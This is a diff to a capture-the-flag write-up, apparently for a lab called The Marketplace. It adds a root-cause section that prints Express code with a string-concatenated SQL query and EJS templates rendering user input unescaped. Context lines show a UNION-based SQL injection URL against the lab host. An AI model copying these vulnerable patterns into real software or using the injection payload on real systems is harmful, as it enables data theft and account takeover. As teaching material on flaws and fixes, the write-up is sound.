@@ -204,7 +204,7 @@ http://10.10.87.36/admin?user=0 union select 1,group_concat(column_name),3,4 fro
 
 Same can be done with other tables as well. There were password hashes but I could not find anything so I enumerated the database further.
 
-Columns in messages
+## Columns in messages
 
 ```bash
 http://10.10.87.36/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='messages'
@@ -408,6 +408,139 @@ drwx------    2 root     root          4096 Aug 23 03:48 .ssh
 ```
 
 Finally we have the flag. We can add our public key to gain root access. 
+# Vulnerable SQLi Code
+
+```jsx
+router.get('/admin', (req, res, next) => {
+  if (!req.loggedIn || !req.user.admin) return res.status(403).render('error', {
+    error: 'You are not authorized to view this page!'
+  });
+  if (req.query.user) {
+    db.query('SELECT * FROM users WHERE id = ' + req.query.user, (error, items, fields) => {
+      if (error) {
+        return res.status(500).render('error', {
+          error
+        });
+      }
+      return res.render('adminUser', {
+        title: `User ${items[0].id}`,
+        user: items[0]
+      });
+    })
+  } else {
+    db.query('SELECT * FROM users', (err, items, fields) => {
+      if (err) {
+        return res.status(500).render('error', {
+          error: 'An error occurred getting user list'
+        });
+      }
+      return res.render('adminPanel', {
+        title: 'User listing',
+        users: items
+      });
+    })
+  }
+})
+```
+
+```bash
+SELECT * FROM users WHERE id = ' + req.query.user
+```
+
+user parameter is directly added to the sql query which resulted in the SQLi vulnerability. Had there been prepared statements used SQLi would have been prevented
+
+## XSS
+
+### Code to store data
+
+```jsx
+router.post('/new', (req, res, next) => {                                                               
+  if (!req.loggedIn) return res.status(403).render('error', {             
+    error: 'Not logged in'                                                                     
+  });                                                                                                   
+  if (req.body.title && req.body.description) {              
+    let obj = {                                                                                
+      title: req.body.title,                                                                            
+      description: req.body.description,                     
+      author: req.user.userId,                                                                 
+      image: '598815c0f5554115631a3250e5db1719'                                                         
+    }                                                        
+                                                                                               
+                                                                                                        
+    db.query(`INSERT INTO items SET ?`, obj, (err, results, fields) => {
+      if (err) {                                                                               
+        console.error(err)                                                                              
+        return res.status(500).send('An error occurred while adding a new listing');
+      }                                                                                                 
+                                                                                            
+      return res.redirect('/item/' + results.insertId);                             
+    })                                                                                         
+  } else {                                                                                  
+    return res.send(400);                                                           
+  }                                                                                            
+})
+```
+
+Data is stored without any filter.
+
+### Code to render data
+
+```jsx
+router.get('/item/:id', function (req, res, next) {                
+  const id = parseInt(req.params.id) * 1;                                                               
+                                                                          
+  if (isNaN(id)) {                                 
+    return res.status(404).render('error', {                                                            
+      error: 'Item not found'                                             
+    });                                                                                        
+  }                                                                                                     
+  db.query(`SELECT users.username, items.* FROM items
+  LEFT JOIN users ON items.author = users.id WHERE items.id = ${id}`, (err, items, fields) => {
+                                                                                                        
+    console.log(err);                                
+    **if (items && items[0]) {                                                                   
+      const item = items[0];                                                                            
+      res.render('item', {                           
+        title: 'Item | The Marketplace',                                                       
+        item                                                                                            
+      })**                                             
+      console.log(item)                                                                        
+    } else {                                                                                            
+      return res.status(404).render('error', {       
+        error: 'Item not found'                                                                         
+      });                                   
+    }                                                
+  });                                                                                          
+});
+
+```
+
+### Template for rendering data
+
+```jsx
+/mnt/home/marketplace/the-marketplace/views # cat item.ejs 
+<!DOCTYPE html>
+<html>
+  <head>
+    <title><%= title %></title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+  </head>
+  <body>
+    <%- include('navigation', { linkToHome: true }) %>
+      <div id="item">
+        <a href="/item/<%= item.id %>"><h1><%- item.title %></h1></a>
+        <img src="/images/<%= item.image %>.jpg" />
+        <div>Published by <%- item.username %></div>
+        <div>Description: <br /> <%- item.description %></div>
+        <div>
+          <a href="/contact/<%= item.username %>">Contact the listing author</a> | <a href="/report/<%= item.id %>">Report listing to admins</a>
+        </div>
+      </div>
+  </body>
+</html>
+```
+
+Still no filter used to render data. This leads to XSS. Had the data been filtered during storage or during render or CSP used the XSS vulnerability leading to access of admin user would have been prevented. Also the cookie did not have property of http only. If it was set, attacker would not have access to the admin cookies.
 
 # What I learned
 
